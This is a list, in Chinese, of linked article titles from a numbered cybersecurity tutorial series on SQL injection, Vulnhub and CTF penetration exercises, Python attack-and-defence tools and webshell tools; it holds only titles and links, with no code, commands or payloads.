*   [[网络安全] 二十六. SQL 注入之揭秘 Oracle 数据库注入漏洞和致命问题（Cream 老师）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489552&idx=1&sn=9336824ddebde336766c51a3674cf764&chksm=cfcca8ddf8bb21cbd1e80f08b012f59cf3d1661e756cd44b335671f5d13392752e0f56f041c1&scene=21#wechat_redirect)
    
*   [[网络安全] 二十七. Vulnhub 靶机渗透之环境搭建及 JIS-CTF 入门和蚁剑提权示例 (1)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247489805&idx=1&sn=89a3970bea60cc4792a3288b9250523d&chksm=cfcca9c0f8bb20d68828a34fcee212aabf869b3937d2cc12f3cf768dda5d1175fcce41ba32cf&scene=21#wechat_redirect)
    
*   [[网络安全] 二十八. Vulnhub 靶机渗透之 DC-1 提权和 Drupal 漏洞利用 (2)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247490070&idx=1&sn=f7060d391eae4c91901efb22d0f4f7ae&chksm=cfccaadbf8bb23cd6d87f2bf0095232f5872519fc04413bbcb3d1451a1a593d2d8f42e3df8ab&scene=21#wechat_redirect)
    
*   [[网络安全] 二十九. 小白渗透之路及 Web 渗透技术总结（i 春秋 YOU 老师）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247490243&idx=1&sn=d88c090287117977d12db27dca221f95&chksm=cfccaa0ef8bb23185205d68f1080c0bb3a4db9f77b39fa5fdaeb7f261fe022b2f7c0ec21e6f6&scene=21#wechat_redirect)
    
*   [[网络安全] 三十. Vulnhub 靶机渗透之 bulldog 信息收集和 nc 反弹 shell(3)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247490908&idx=1&sn=d11ddda2cf0691720a1c945fb6164499&chksm=cfccad91f8bb2487b0ec754d66bd803a797c8fa0e222993b029b4c02e35d899561279abf9b11&scene=21#wechat_redirect)
    
*   [[网络安全] 三十一. Sqlmap 基础用法、CTF 实战及请求参数设置万字详解](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491106&idx=1&sn=1133bb304f172d75671a3b0dedfa333f&chksm=cfccaeeff8bb27f9eddf5b8c4133624c28540b16212721ec67579f4f149f239a492fd8ace46d&scene=21#wechat_redirect)
    
*   [[网络安全] 三十二. Python 攻防之获取 Windows 主机信息、注册表、U 盘痕迹和回收站 (1)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491312&idx=1&sn=5e5890a006503e1ea46a92c902885356&chksm=cfccae3df8bb272b77f3f81c121d47ee1b4eda5e06f5c21d39ddc9175daa8bb5fd1af2dd4209&scene=21#wechat_redirect)
    
*   [[网络安全] 三十三. Python 攻防之正则表达式、网络爬虫和套接字通信入门 (2)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491345&idx=1&sn=8b292a76e449f5bf7e2dd13e77340d18&chksm=cfccafdcf8bb26ca24394bc72c55941e0ac23f1a0c350d929b5223c03d7a87696f9c9c26623f&scene=21#wechat_redirect)
    
*   [[网络安全] 三十四. Python 攻防之实现 IP 及端口扫描器、多线程 C 段扫描器 (3)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491471&idx=1&sn=eec28543a1f555dfbf3ab9cb65cfb7f1&chksm=cfccaf42f8bb26543a741390026e6e3539f1d782a8f0934c8c21be359550fc6c260d9cb2e98c&scene=21#wechat_redirect)
    
*   [[网络安全] 三十五. Python 攻防之弱口令、自定义字典生成及网站防护 (4)](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491543&idx=1&sn=3301c3d16401a714ddd2c68303bb1ac0&chksm=cfccaf1af8bb260c5fef54ac5cb607b6b74a4487802f297fdf84256c6db864bd64d8795960dd&scene=21#wechat_redirect)  
    
*   [[网络安全] 三十六. 津门杯 CTF 的 Web Write-Up 万字详解（SSRF、文件上传、SQL 注入、代码审计、中国蚁剑）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491443&idx=1&sn=315f9b74a42bed90ab0f10ec33330ca0&chksm=cfccafbef8bb26a83c1b7a66484fe35443937020837f4449206a67cbe8a2dff8dc431eec23bc&scene=21#wechat_redirect)
    
*   [[网络安全] 三十七. 实验吧七道入门 CTF 题目（Web 渗透和隐写方向）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491631&idx=1&sn=5dcb8f1e6d553aecaa4f7397c04bce3a&chksm=cfcf50e2f8b8d9f4dffc60468b3db3fef6a81abdf5886474d4236b37f78deeae0da7a394afdf&scene=21#wechat_redirect)
    
*   [[网络安全] 三十八. WHUCTF (1)SQL 脚本盲注和命令执行绕过（easy_sqli、ezcmd）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491664&idx=1&sn=f7dfdde0e2600825f9b0355fdebb7cd0&chksm=cfcf509df8b8d98b4f90000b9449d799aa349b229d25a0fde018782bae5aad3c71e95a6eedd0&scene=21#wechat_redirect)
    
*   [[网络安全] 三十九. WHUCTF (2) 代码审计和文件包含漏洞绕过（ezphp、ezinclude）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247491833&idx=1&sn=0e7c0cca27d0b2d00d806084c36054fa&chksm=cfcf5034f8b8d922f7f1d59340f76d37e288ce6a813bffa79015c511512f52657c5f91a9bd4c&scene=21#wechat_redirect)
    
*   [网络安全] 四十. WHUCTF (3) 一道非常经典的文件上传漏洞题（冰蝎蚁剑详解）